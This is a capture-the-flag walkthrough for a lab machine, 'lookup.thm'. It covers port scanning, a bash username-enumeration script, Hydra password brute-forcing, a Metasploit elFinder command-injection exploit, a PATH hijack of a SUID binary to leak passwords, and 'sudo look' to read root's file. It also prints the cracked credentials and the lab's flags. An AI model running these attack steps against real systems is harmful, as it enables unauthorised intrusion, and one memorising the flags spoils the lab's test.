
First -> Scanning :


1.

sudo masscan -p 1-65535 --interface tun0 --rate 250 10.10.247.158

sudo masscan -p 1-65535 --interface tun0 --rate 250 10.10.247.158
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-11-23 07:18:05 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.247.158                                   
Discovered open port 80/tcp on 10.10.247.158  


2.

sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p22,80 --open --min-rate=1000 10.10.247.158 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 02:25 EST
Nmap scan report for lookup.thm (10.10.247.158)
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   201.64 ms 10.2.0.1 (10.2.0.1)
2   ... 3
4   325.93 ms lookup.thm (10.10.247.158)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.28 second





Second -> Information Gathering(Enumaration) :


1.
whatweb http://lookup.thm                                                                                                  

http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.247.158], PasswordField[password], Title[Login Page]

2.
gobuster dir --url http://lookup.thm/ --wordlist=/usr/share/dirb/wordlists/common.txt 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 719]
/server-status        (Status: 403) [Size: 275]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================


3.

ffuf -w /usr/share/legion/wordlists/gvit_subdomain_wordlist.txt -u http://FUZZ.lookup.thm -mc 200


4.

script for user enumeration

#!/bin/bash

# Define the target URL
url="http://lookup.thm/login.php"

# Define the file path containing usernames
file_path="/usr/share/seclists/Usernames/Names/names.txt"

# Check if the file exists
if [[ ! -f "$file_path" ]]; then
    echo "Error: The file $file_path does not exist."
    exit 1
fi

# Loop through each username in the wordlist
while IFS= read -r username; do
    # Skip empty lines
    if [[ -z "$username" ]]; then
        continue
    fi

    # Send POST request with fixed password
    response=$(curl -s -X POST "$url" -d "username=$username&password=password")

    # Check for specific strings in the response
    if echo "$response" | grep -q "Wrong password"; then
        echo "Username found: $username"
    elif echo "$response" | grep -q "wrong username"; then
        continue  # Silent continuation for wrong usernames
    fi
done < "$file_path"

./enum_users.sh   
Username found: admin
Username found: jose


5.

password enumeration with hydra :

hydra -l jose -P ~/Desktop/CTF/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"

[80][http-post-form] host: lookup.thm   login: jose   password: password123

So 

User -> jose 
Pass -> password123


After login that should add the sub domain of website that files.lookup.thm

10.10.247.158 lookup.thm files.lookup.thm

exploit 

search elFinder
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
options
run

ls -la /home
ls -la /home/think
cat /home/think/.password


find / -perm /4000 2>/dev/null
/usr/sbin/pwm

echo $PATH
export PATH=/tmp:$PATH
echo $PATH

echo '
#! bin/bash
echo "uid=33(think) gid=33(think) groups=33()think"
' > /tmp/id

chmod +x id
/usr/sbin/pwm

i got the wordlist for think password

wordlist_for_pass

jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171

hydra -l think -P pass.txt ssh://lookup.thm -I

ssh :

user -> think 
pass -> josemario.AKA(think)

privilege esclation :

sudo -l
(ALL) /usr/bin/look
LFILE=/root/root.txt
sudo look '' "$LFILE"


user.txt : 38375fb4dd8baa2b2039ac03d92b820e
root.txt : 5a285a9f257e45c68bb6c9f9f57d18e8


D0Ne!!
